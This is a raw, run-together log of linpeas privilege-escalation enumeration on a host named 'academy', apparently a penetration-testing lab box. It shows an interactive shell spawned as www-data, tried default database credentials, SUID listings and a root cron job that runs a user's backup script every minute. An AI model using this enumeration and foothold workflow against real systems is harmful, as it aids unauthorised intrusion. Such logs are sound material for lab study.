/usr/sbin/apache2 -k startwww-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -iwww-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -iwww-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.shwww-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux[+] Binary processes permissions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                       56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                          0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald228K -rwxr-xr-x 1 root root 227K Mar 18  2021 /lib/systemd/systemd-logind 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd[+] Cron jobs[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 -rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          /etc/cron.d:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rw-r--r--  1 root root  712 Dec 17  2018 php/etc/cron.daily:total 40drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd/etc/cron.hourly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.monthly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.weekly:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  813 Feb 10  2019 man-dbSHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin* * * * * /home/grimmie/backup.sh[+] Services[i] Search for outdated versions                                                                                                                                [ - ]  apache-htcacheclean                                                                                                                                     [ + ]  apache2 [ + ]  apparmor [ - ]  console-setup.sh [ + ]  cron [ + ]  dbus [ - ]  hwclock.sh [ - ]  keyboard-setup.sh [ + ]  kmod [ + ]  mysql [ + ]  networking [ + ]  procps [ - ]  rsync [ + ]  rsyslog [ + ]  ssh [ + ]  udev [ + ]  vsftpd===================================( Network Information )====================================[+] Hostname, hosts and DNS                                                                                                                                    academy                                                                                                                                                        127.0.0.1       localhost127.0.1.1       academy.tcm.sec academy::1     localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersdomain localdomainsearch localdomainnameserver 172.16.2.2tcm.sec[+] Content of /etc/inetd.conf/etc/inetd.conf Not Found                                                                                                                                                                                                                                                                                                     [+] Networks and neighboursdefault         0.0.0.0                                                                                                                                        loopback        127.0.0.0link-local      169.254.0.01: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33       valid_lft 1638sec preferred_lft 1638sec    inet6 fe80::20c:29ff:fea6:6e61/64 scope link        valid_lft forever preferred_lft forever172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE[+] Iptables rulesiptables rules Not Found                                                                                                                                                                                                                                                                                                      [+] Active Ports[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                                                                                                                                                                                           [+] Can I sniff with tcpdump?No                                                                                                                                                                                                                                                                                                                            ====================================( Users Information )=====================================[+] My user                                                                                                                                                    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          [+] Do I have PGP keys?gpg Not Found                                                                                                                                                                                                                                                                                                                 [+] Clipboard or highlighted text?xsel and xclip Not Found                                                                                                                                                                                                                                                                                                      [+] Testing 'sudo -l' without password & /etc/sudoers[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                                                                                                                                                                          [+] Checking /etc/doas.conf/etc/doas.conf Not Found                                                                                                                                                                                                                                                                                                      [+] Checking Pkexec policy                                                                                                                                                               [+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                                                                                                                                                                             [+] Superusersroot:x:0:0:root:/root:/bin/bash                                                                                                                                [+] Users with consolegrimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   root:x:0:0:root:/root:/bin/bash[+] Login information 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATroot     tty1     -                10:18   29:42   0.04s  0.01s -bashroot     tty1                          Sat May 29 13:31 - down   (00:12)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)root     tty1                          Sat May 29 13:16 - down   (00:11)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)administ tty1                          Sat May 29 13:06 - down   (00:08)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)wtmp begins Sat May 29 13:05:58 2021[+] All users_apt                                                                                                                                                           backupbindaemonftpgamesgnatsgrimmieirclistlpmailmanmessagebusmysqlnewsnobodyproxyrootsshdsyncsyssystemd-coredumpsystemd-networksystemd-resolvesystemd-timesyncuucpwww-data[+] Password policyPASS_MAX_DAYS   99999                                                                                                                                          PASS_MIN_DAYS   0PASS_WARN_AGE   7ENCRYPT_METHOD SHA512===================================( Software Information )===================================[+] MySQL version                                                                                                                                              mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      [+] MySQL connection using default root/root ........... No[+] MySQL connection using root/toor ................... No                                                                                                    [+] MySQL connection using root/NOPASS ................. No                                                                                                    [+] Looking for mysql credentials and exec                                                                                                                     From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     Found readable /etc/mysql/my.cnf[client-server]!includedir /etc/mysql/conf.d/!includedir /etc/mysql/mariadb.conf.d/[+] PostgreSQL version and pgadmin credentials Not Found                                                                                                                                                                                                                                                                                                                    [+] PostgreSQL connection to template0 using postgres/NOPASS ........ No[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       [+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       [+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                                                                                                                                                                                      [+] Apache server infoVersion: Server version: Apache/2.4.38 (Debian)                                                                                                                Server built:   2020-08-25T20:08:29[+] Looking for PHPCookies Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Wordpress wp-config.php fileswp-config.php Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for Tomcat users filetomcat-users.xml Not Found                                                                                                                                                                                                                                                                                                    [+] Mongo information Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for supervisord configuration filesupervisord.conf Not Found                                                                                                                                                                                                                                                                                                    [+] Looking for cesi configuration filecesi.conf Not Found                                                                                                                                                                                                                                                                                                           [+] Looking for Rsyncd config file/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      [ftp]        comment = public archive        path = /var/www/pub        use chroot = yes        lock file = /var/lock/rsyncd        read only = yes        list = yes        uid = nobody        gid = nogroup        strict modes = yes        ignore errors = no        ignore nonreadable = yes        transfer logging = no        timeout = 600        refuse options = checksum dry-run        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz[+] Looking for Hostapd config filehostapd.conf Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for wifi conns file Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Anaconda-ks config filesanaconda-ks.cfg Not Found                                                                                                                                                                                                                                                                                                     [+] Looking for .vnc directories and their passwd files.vnc Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for ldap directories and their hashes/etc/ldap                                                                                                                                                      The password hash is from the {SSHA} to 'structural'[+] Looking for .ovpn files and credentials.ovpn Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for ssl/ssh filesPermitRootLogin yes                                                                                                                                            ChallengeResponseAuthentication noUsePAM yesLooking inside /etc/ssh/ssh_config for interesting infoHost *    SendEnv LANG LC_*    HashKnownHosts yes    GSSAPIAuthentication yes[+] Looking for unexpected auth lines in /etc/pam.d/sshdNo                                                                                                                                                                                                                                                                                                                            [+] Looking for Cloud credentials (AWS, Azure, GC)                                                                                                                                                               [+] NFS exports?[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         /etc/exports Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for kerberos conf files and tickets[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          krb5.conf Not Found                                                                                                                                            tickets kerberos Not Found                                                                                                                                     klist Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for Kibana yamlkibana.yml Not Found                                                                                                                                                                                                                                                                                                          [+] Looking for logstash files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for elasticsearch files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Vault-ssh filesvault-ssh-helper.hcl Not Found                                                                                                                                                                                                                                                                                                [+] Looking for AD cached hahsescached hashes Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for screen sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            screen Not Found                                                                                                                                                                                                                                                                                                              [+] Looking for tmux sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            tmux Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for Couchdb directory                                                                                                                                                               [+] Looking for redis.conf                                                                                                                                                               [+] Looking for dovecot filesdovecot credentials Not Found                                                                                                                                                                                                                                                                                                 [+] Looking for mosquitto.conf                                                                                                                                                               ====================================( Interesting Files )=====================================[+] SUID                                                                                                                                                       [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    /usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/bin/chfn           --->    SuSE_9.3/10/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8/usr/bin/newgrp         --->    HP-UX_10.20/usr/bin/umount         --->    BSD/Linux[1996-08-13]/usr/bin/chsh/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM/usr/bin/su/usr/bin/gpasswd[+] SGID[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/sbin/unix_chkpwd                                                                                                                                          /usr/bin/bsd-write/usr/bin/expiry/usr/bin/wall/usr/bin/crontab/usr/bin/dotlockfile/usr/bin/chage/usr/bin/ssh-agent[+] Capabilities[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   /usr/bin/ping = cap_net_raw+ep                                                                                                                                 [+] .sh files in path/usr/bin/gettext.sh                                                                                                                                            [+] Files (scripts) in /etc/profile.d/total 20                                                                                                                                                       drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh[+] Hashes inside passwd file? ........... No[+] Can I read shadow files? ........... No                                                                                                                    [+] Can I read root folder? ........... No                                                                                                                                                                                                                                                                                    [+] Looking for root files in home dirs (limit 20)/home                                                                                                                                                          [+] Looking for root files in folders owned by me                                                                                                                                                               [+] Readable files belonging to root and readable by me but not world readable                                                                                                                                                               [+] Files inside /home/www-data (limit 20)                                                                                                                                                               [+] Files inside others home (limit 20)/home/grimmie/.bash_history                                                                                                                                    /home/grimmie/.bashrc/home/grimmie/backup.sh/home/grimmie/.profile/home/grimmie/.bash_logout[+] Looking for installed mail applications                                                                                                                                                               [+] Mails (limit 50)                                                                                                                                                               [+] Backup files?-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    -rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup[+] Looking for tables inside readable .db/.sqlite files (limit 100)                                                                                                                                                               [+] Web files?(output limit)/var/www/:                                                                                                                                                     total 12Kdrwxr-xr-x  3 root root 4.0K May 29  2021 .drwxr-xr-x 12 root root 4.0K May 29  2021 ..drwxr-xr-x  3 root root 4.0K May 29  2021 html/var/www/html:total 24Kdrwxr-xr-x 3 root     root     4.0K May 29  2021 .drwxr-xr-x 3 root     root     4.0K May 29  2021 ..[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            -rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      -rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                           270249      4 -rw-r--r--   1 root     root               240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 /tmp/linpeas.sh                                                                                             -rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0[+] Interesting writable Files[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 /dev/mqueue                                                                                                                                                    /dev/mqueue/linpeas.txt/dev/shm/run/lock/run/lock/apache2/sys/kernel/security/apparmor/.access/sys/kernel/security/apparmor/.load/sys/kernel/security/apparmor/.remove/sys/kernel/security/apparmor/.replace/tmp/tmp/linpeas.sh/var/cache/apache2/mod_cache_disk/var/lib/php/sessions/var/lib/phpmyadmin/var/lib/phpmyadmin/tmp/var/lib/phpmyadmin/tmp/twig/var/lib/phpmyadmin/tmp/twig/15/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php/var/lib/phpmyadmin/tmp/twig/21/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php/var/lib/phpmyadmin/tmp/twig/22/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php/var/lib/phpmyadmin/tmp/twig/28/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php/var/lib/phpmyadmin/tmp/twig/2e/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php/var/lib/phpmyadmin/tmp/twig/31/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php/var/lib/phpmyadmin/tmp/twig/36/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php/var/lib/phpmyadmin/tmp/twig/3b/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php/var/lib/phpmyadmin/tmp/twig/41/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php/var/lib/phpmyadmin/tmp/twig/42/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php/var/lib/phpmyadmin/tmp/twig/43/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php/var/lib/phpmyadmin/tmp/twig/4c/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php/var/lib/phpmyadmin/tmp/twig/4e/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php/var/lib/phpmyadmin/tmp/twig/4f/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php/var/lib/phpmyadmin/tmp/twig/53/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php/var/lib/phpmyadmin/tmp/twig/5c/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php/var/lib/phpmyadmin/tmp/twig/61/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php/var/lib/phpmyadmin/tmp/twig/6b/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php/var/lib/phpmyadmin/tmp/twig/6c/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php/var/lib/phpmyadmin/tmp/twig/73/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php/var/lib/phpmyadmin/tmp/twig/78/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php/var/lib/phpmyadmin/tmp/twig/7d/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php/var/lib/phpmyadmin/tmp/twig/7f/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php/var/lib/phpmyadmin/tmp/twig/8a/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php/var/lib/phpmyadmin/tmp/twig/8b/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php/var/lib/phpmyadmin/tmp/twig/96/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php/var/lib/phpmyadmin/tmp/twig/97/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php/var/lib/phpmyadmin/tmp/twig/99/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php/var/lib/phpmyadmin/tmp/twig/9d/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php/var/lib/phpmyadmin/tmp/twig/9e/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php/var/lib/phpmyadmin/tmp/twig/a0/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php/var/lib/phpmyadmin/tmp/twig/a4/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php/var/lib/phpmyadmin/tmp/twig/a7/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php/var/lib/phpmyadmin/tmp/twig/ae/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php/var/lib/phpmyadmin/tmp/twig/af/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php/var/lib/phpmyadmin/tmp/twig/b6/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php/var/lib/phpmyadmin/tmp/twig/c3/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php/var/lib/phpmyadmin/tmp/twig/c5/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php/var/lib/phpmyadmin/tmp/twig/c7/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php/var/lib/phpmyadmin/tmp/twig/ca/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php/var/lib/phpmyadmin/tmp/twig/d6/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php/var/lib/phpmyadmin/tmp/twig/dd/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php/var/lib/phpmyadmin/tmp/twig/e8/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php/var/lib/phpmyadmin/tmp/twig/e9/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php/var/lib/phpmyadmin/tmp/twig/f5/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php/var/lib/phpmyadmin/tmp/twig/fa/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php/var/tmp/var/www/html/academy/var/www/html/academy/admin/var/www/html/academy/admin/assets/var/www/html/academy/admin/assets/css/var/www/html/academy/admin/assets/css/bootstrap.css/var/www/html/academy/admin/assets/css/font-awesome.css/var/www/html/academy/admin/assets/css/style.css/var/www/html/academy/admin/assets/fonts/var/www/html/academy/admin/assets/fonts/FontAwesome.otf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/admin/assets/img/var/www/html/academy/admin/assets/js/var/www/html/academy/admin/assets/js/bootstrap.js/var